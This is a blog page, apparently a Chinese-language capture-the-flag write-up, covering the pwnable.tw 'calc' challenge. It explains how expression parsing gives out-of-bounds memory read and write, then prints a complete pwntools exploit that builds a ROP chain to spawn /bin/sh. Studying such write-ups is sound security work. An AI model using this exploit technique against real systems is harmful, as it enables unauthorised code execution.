@@ -1,0 +1,661 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="SpongeBob">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677int __cdecl parse_expr(int ptr, _DWORD *initpool)&amp;#1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="calc">
+<meta property="og:url" content="http://spongebob-369.github.io/2026/12/04/calc/index.html">
+<meta property="og:site_name" content="SpongeBobの pineapple house">
+<meta property="og:description" content="1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677int __cdecl parse_expr(int ptr, _DWORD *initpool)&amp;#1">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2026-12-04T13:15:13.000Z">
+<meta property="article:modified_time" content="2026-01-04T13:17:50.466Z">
+<meta property="article:author" content="SpongeBob">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>calc - SpongeBobの pineapple house</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"spongebob-369.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>SpongeBob&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="calc"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-12-04 21:15" pubdate>
+          December 4, 2026 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          9 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">calc</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <span id="more"></span>
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __cdecl parse_expr(<span class="hljs-built_in">int</span> ptr, _DWORD *initpool)<br>&#123;<br>  <span class="hljs-built_in">int</span> count; // eax<br>  <span class="hljs-built_in">int</span> ptr_0; // [esp+20h] [ebp-88h]<br>  <span class="hljs-built_in">int</span> i; // [esp+24h] [ebp-84h]<br>  <span class="hljs-built_in">int</span> v6; // [esp+28h] [ebp-80h]<br>  <span class="hljs-built_in">int</span> length; // [esp+2Ch] [ebp-7Ch]<br>  char *s1; // [esp+30h] [ebp-78h]<br>  <span class="hljs-built_in">int</span> num; // [esp+34h] [ebp-74h]<br>  _BYTE s[<span class="hljs-number">100</span>]; // [esp+38h] [ebp-70h] BYREF<br>  unsigned <span class="hljs-built_in">int</span> v11; // [esp+9Ch] [ebp-Ch]<br><br>  v11 = __readgsdword(0x14u);<br>  ptr_0 = ptr;<br>  v6 = <span class="hljs-number">0</span>;<br>  bzero(s, 100u);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; ++i )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( (unsigned <span class="hljs-built_in">int</span>)(*(char *)(i + ptr) - <span class="hljs-number">48</span>) &gt; <span class="hljs-number">9</span> )<br>    &#123;<br>      length = i + ptr - ptr_0;<br>      s1 = (char *)malloc(length + <span class="hljs-number">1</span>);<br>      memcpy(s1, ptr_0, length);<br>      s1[length] = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">if</span> ( !strcmp(s1, <span class="hljs-string">&quot;0&quot;</span>) )<br>      &#123;<br>        puts(<span class="hljs-string">&quot;prevent division by zero&quot;</span>);<br>        fflush(stdout);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>      &#125;<br>      num = atoi(s1);<br>      <span class="hljs-keyword">if</span> ( num &gt; <span class="hljs-number">0</span> )<br>      &#123;<br>        count = (*initpool)++;<br>        initpool[count + <span class="hljs-number">1</span>] = num;<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( *(_BYTE *)(i + ptr) &amp;&amp; (unsigned <span class="hljs-built_in">int</span>)(*(char *)(i + <span class="hljs-number">1</span> + ptr) - <span class="hljs-number">48</span>) &gt; <span class="hljs-number">9</span> )// 连续两个运算符<br>      &#123;<br>        puts(<span class="hljs-string">&quot;expression error!&quot;</span>);<br>        fflush(stdout);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>      &#125;<br>      ptr_0 = i + <span class="hljs-number">1</span> + ptr;<br>      <span class="hljs-keyword">if</span> ( s[v6] )                              // 如果有前序运算符<br>      &#123;<br>        switch ( *(_BYTE *)(i + ptr) )<br>        &#123;<br>          <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;%&#x27;</span>:<br>          <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;*&#x27;</span>:<br>          <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;/&#x27;</span>:<br>            <span class="hljs-keyword">if</span> ( s[v6] != <span class="hljs-string">&#x27;+&#x27;</span> &amp;&amp; s[v6] != <span class="hljs-string">&#x27;-&#x27;</span> )<br>              goto LABEL_14;<br>            s[++v6] = *(_BYTE *)(i + ptr);<br>            <span class="hljs-keyword">break</span>;<br>          <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;+&#x27;</span>:<br>          <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;-&#x27;</span>:<br>LABEL_14:<br>            <span class="hljs-built_in">eval</span>(initpool, (char)s[v6]);<br>            s[v6] = *(_BYTE *)(i + ptr);<br>            <span class="hljs-keyword">break</span>;<br>          default:<br>            <span class="hljs-built_in">eval</span>(initpool, (char)s[v6--]);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>      &#125;<br>      <span class="hljs-keyword">else</span>                                      // 如果没有，就将运算符放入s数组<br>      &#123;<br>        s[v6] = *(_BYTE *)(i + ptr);<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( !*(_BYTE *)(i + ptr) )<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v6 &gt;= <span class="hljs-number">0</span> )<br>    <span class="hljs-built_in">eval</span>(initpool, (char)s[v6--]);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>分析 <code>parse_expr</code> 函数，从表达式开始看，如果碰到运算符，则记录一下之前数字的长度，并且将数字放到数组 s1 中，用 <code>atoi</code> 进行转换。</p>
+<p><code>initpool[0]</code> 存放的是运算数字的个数，数组后面的每一个存的是对应的运算数字。</p>
+<p>这里主要是要搞清楚 <code>initpool</code> 和 <code>s</code> 数据结构代表的含义。下面是两种漏洞的利用:</p>
+<p><code>+x</code> 表达式的处理：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">initpool[count - <span class="hljs-number">1</span>] = initpool[count - <span class="hljs-number">1</span>] + initpool[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>+x<br><br>*initpool-- <span class="hljs-comment">// 也就是initpool[0] = initpool[0] - 1 = x</span><br></code></pre></td></tr></table></figure>
+
+<p>之后，在 <code>calc</code> 函数中，会打印内容：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, initpool[initpool[<span class="hljs-number">0</span>]]);<br></code></pre></td></tr></table></figure>
+
+<p>即打印 <code>initpool[x]</code> 的内容，如果x很大，就实现了数组越界读。</p>
+<p><code>+x+y</code> 表达式的处理：</p>
+<p>在 <code>+x</code> 的基础上，运算符还有一个+，读完y之后，遇到空字符，然后开始处理，目前数组情况如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">x <span class="hljs-comment">// initpool[0]</span><br>------------------<br>y      |    +    |<br>       |         |<br>------------------<br></code></pre></td></tr></table></figure>
+
+<p>遇到空字符，执行下面的代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">num = atoi(s1);<br><span class="hljs-keyword">if</span> ( num &gt; <span class="hljs-number">0</span> )<br>&#123;<br>  count = (*initpool)++;<br>  initpool[count + <span class="hljs-number">1</span>] = num;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>num 现在就是y，count &#x3D; x，所以将 <code>initpool[x+1]</code> 变成了 y 。</p>
+<p>然后再进入 <code>eval</code> 函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">initpool[initpool[<span class="hljs-number">0</span>]<span class="hljs-number">-1</span>] = initpool[x]<br>initpool[x] = initpool[x] + initpool[x+<span class="hljs-number">1</span>]<br>						= initpool[x] + y<br>initpool[<span class="hljs-number">0</span>]-- <span class="hljs-comment">// initpool[0] = initpool[0] - 1 = x + 1 - 1 = x</span><br></code></pre></td></tr></table></figure>
+
+<p>可以看到这一步将 <code>initpool[x]</code> 处的内容改为其原本的内容 + y，这样就可以先读到其内容，然后再改为想要的值了。然后还会打印修改后的 <code>initpool[x]</code> 的内容，可以方便在dbg的时候看看改的对不对。</p>
+<p>计算器可以看作是一个无限循环，所以就可以开始构造ROP链了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.update(os=<span class="hljs-string">&quot;Linux&quot;</span>, arch=<span class="hljs-string">&quot;i386&quot;</span>)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br><br>url = <span class="hljs-string">&quot;chall.pwnable.tw 10100&quot;</span><br>HOST, POST = url.split(<span class="hljs-string">&quot; &quot;</span>)<br>p = remote(HOST, <span class="hljs-built_in">int</span>(POST))<br><span class="hljs-comment"># p = process(&quot;./pwn&quot;)</span><br>script = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    b *0x80493ed</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">abr</span>(<span class="hljs-params">offset</span>):<br>    payload = <span class="hljs-string">&quot;+&quot;</span> + <span class="hljs-built_in">str</span>(offset)<br>    payload = payload.encode()<br>    p.sendline(payload)<br>    data = p.recvline().strip().decode()<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">abw</span>(<span class="hljs-params">offset, data</span>):<br>    context = abr(offset)<br>    real_data = data - context<br>    <span class="hljs-keyword">if</span> real_data &lt; <span class="hljs-number">0</span>:<br>        real_data = -real_data<br>        payload = <span class="hljs-string">&quot;+&quot;</span> + <span class="hljs-built_in">str</span>(offset) + <span class="hljs-string">&quot;-&quot;</span> + <span class="hljs-built_in">str</span>(real_data)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># 这里得看发送的data以什么形式存到内存。</span><br>        payload = <span class="hljs-string">&quot;+&quot;</span> + <span class="hljs-built_in">str</span>(offset) + <span class="hljs-string">&quot;+&quot;</span> + <span class="hljs-built_in">str</span>(real_data)<br>    payload = payload.encode()<br>    p.sendline(payload)<br>    modified = p.recvline().strip().decode()<br>    log.info(<span class="hljs-string">f&quot;offset: <span class="hljs-subst">&#123;offset&#125;</span> modified : <span class="hljs-subst">&#123;modified&#125;</span> = <span class="hljs-subst">&#123;data&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># 32位的ROP</span><br>pop_eax_ret = <span class="hljs-number">0x0805c34b</span><br>pop_3_ret = <span class="hljs-number">0x080701d0</span> <span class="hljs-comment"># edx ecx ebx</span><br>int_80 = <span class="hljs-number">0x08049a21</span><br><br><span class="hljs-comment"># gdb.attach(p, script)</span><br>p.recvuntil(<span class="hljs-string">b&quot;=== Welcome to SECPROG calculator ===\n&quot;</span>)<br>data = abr(<span class="hljs-number">360</span>)<br>ebp = data - <span class="hljs-number">0x20</span><br>log.info(<span class="hljs-string">f&quot;ebp: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(ebp)&#125;</span>&quot;</span>)<br>bin_sh_addr = ebp + <span class="hljs-number">8</span> * <span class="hljs-number">4</span><br><span class="hljs-comment"># execve(&#x27;/bin/sh&#x27;, 0, 0)</span><br>a = u32(<span class="hljs-string">b&quot;/bin&quot;</span>)<br>b = u32(<span class="hljs-string">b&quot;/sh\x00&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;a: <span class="hljs-subst">&#123;a&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;b: <span class="hljs-subst">&#123;b&#125;</span>&quot;</span>)<br><br>ROP_chain = [pop_eax_ret, <span class="hljs-number">11</span>, pop_3_ret, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, bin_sh_addr, int_80, a, b]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ROP_chain)):<br>    abw(<span class="hljs-number">361</span> + i, ROP_chain[i])<br><br>p.interactive()<br><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br><br><span class="hljs-comment"># script = &quot;&quot;&quot;</span><br><span class="hljs-comment">#     b *0x80493ed</span><br><span class="hljs-comment"># &quot;&quot;&quot;</span><br><br><span class="hljs-comment"># gdb.attach(io, script)</span><br><br><span class="hljs-comment"># a = int(&#x27;/bin&#x27;[::-1].encode().hex(),16)</span><br><span class="hljs-comment"># b = int(&#x27;/sh&#x27;[::-1].encode().hex(),16)</span><br><span class="hljs-comment"># pop_eax = 0x0805c34b</span><br><span class="hljs-comment"># pop_edx_ecx_ebx = 0x080701d0</span><br><span class="hljs-comment"># int_80 = 0x08049a21</span><br><br><span class="hljs-comment"># # leak ebp</span><br><span class="hljs-comment"># io.recv()</span><br><span class="hljs-comment"># io.sendline(&quot;+360&quot;)</span><br><span class="hljs-comment"># ebp = int(io.recv())-0x20</span><br><span class="hljs-comment"># binsh_addr = ebp+8*4</span><br><br><span class="hljs-comment"># # attack</span><br><span class="hljs-comment"># ROP_chain = [pop_eax,11,pop_edx_ecx_ebx,0,0,binsh_addr,int_80,a,b]</span><br><span class="hljs-comment"># for i in range(361,370):</span><br><span class="hljs-comment"># 	num = i - 361</span><br><span class="hljs-comment"># 	io.sendline(&quot;+&quot;+str(i))</span><br><span class="hljs-comment"># 	tmp = int(io.recvline())</span><br><span class="hljs-comment"># 	if tmp&lt;ROP_chain[num]:</span><br><span class="hljs-comment"># 		io.sendline(&quot;+&quot;+str(i)+&quot;+&quot;+str(ROP_chain[num]-tmp))</span><br><span class="hljs-comment"># 	else:</span><br><span class="hljs-comment"># 		io.sendline(&quot;+&quot;+str(i)+&quot;-&quot;+str(tmp-ROP_chain[num]))</span><br><span class="hljs-comment"># 	io.recvline()</span><br><br><span class="hljs-comment"># io.sendline()</span><br><span class="hljs-comment"># io.interactive()</span><br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ctf/" class="print-no-link">#ctf</a>
+      
+        <a href="/tags/Pwn/" class="print-no-link">#Pwn</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>calc</div>
+      <div>http://spongebob-369.github.io/2026/12/04/calc/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>SpongeBob</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>December 4, 2026</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/12/26/3x17-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/" title="3x17 - 任意地址写控制程序流">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">3x17 - 任意地址写控制程序流</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/10/08/travel-sichuan/" title="travel_sichuan">
+                        <span class="hidden-mobile">travel_sichuan</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
